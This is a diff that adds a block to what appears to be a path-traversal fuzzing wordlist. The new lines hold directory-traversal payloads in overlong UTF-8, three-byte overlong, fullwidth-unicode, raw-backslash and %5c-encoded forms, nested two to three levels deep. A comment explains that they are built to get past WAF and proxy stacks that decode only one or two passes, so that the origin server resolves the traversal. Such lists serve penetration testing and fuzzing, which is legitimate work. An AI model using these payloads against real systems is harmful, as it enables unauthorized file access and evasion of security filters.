@@ -647,3 +647,24 @@
 [h]%c0%afx%c0%af..
 [h]%ef%bc%8f;x/..
 [h]%ef%bc%8fx%ef%bc%8f..
+
+# ------------------------------------------------------------------------------
+# Depth-chained traversal for non-ASCII primitives ([h]). Targets WAF/proxy
+# stacks that only normalize 1-2 passes of a given encoding before giving up —
+# leftover unchopped traversals pass through, origin keeps going and lands on
+# target. Depth 2-3 covers most historical parser-depth-limit bugs.
+# ------------------------------------------------------------------------------
+# Overlong UTF-8 (%c0%ae = '.', %c0%af = '/')
+[h]%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
+[h]%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
+# 3-byte overlong
+[h]%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%af
+# Fullwidth unicode (%ef%bc%8e = fullwidth '.', %ef%bc%8f = fullwidth '/')
+[h]%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f
+[h]%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f
+# Raw backslash traversal (Windows / nginx)
+[h]..\..\
+[h]..\..\..\
+# Encoded backslash
+[h]..%5c..%5c
+[h]..%5c..%5c..%5c
